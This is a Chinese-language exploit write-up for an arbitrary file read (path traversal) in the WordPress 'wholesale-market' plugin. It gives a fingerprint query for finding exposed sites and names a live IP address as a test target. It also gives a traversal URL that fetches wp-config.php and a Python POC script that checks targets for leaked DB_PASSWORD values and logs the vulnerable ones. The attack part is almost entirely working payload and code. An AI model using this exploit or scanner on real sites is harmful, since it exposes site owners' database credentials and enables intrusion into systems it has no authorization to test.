## 一、资产搜索

```
body="wp-content/plugins/wholesale-market"
```

## 二、网站测试

```
https://213.159.208.2
```

## 三、验证漏洞

拼接api

```
/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php
```

![image-20240905180302735](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240905180302735.png)

## 四、POC

```
def poc(target):
    payload = "/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "DB_PASSWORD" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"[+]该网站{target}存在任意文件读取漏洞\n")
                print(f"[+]该网站{target}存在任意文件读取漏洞")
            else:
                print(f"[+]该网站{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请手动测试！！")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240905181824851](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240905181824851.png)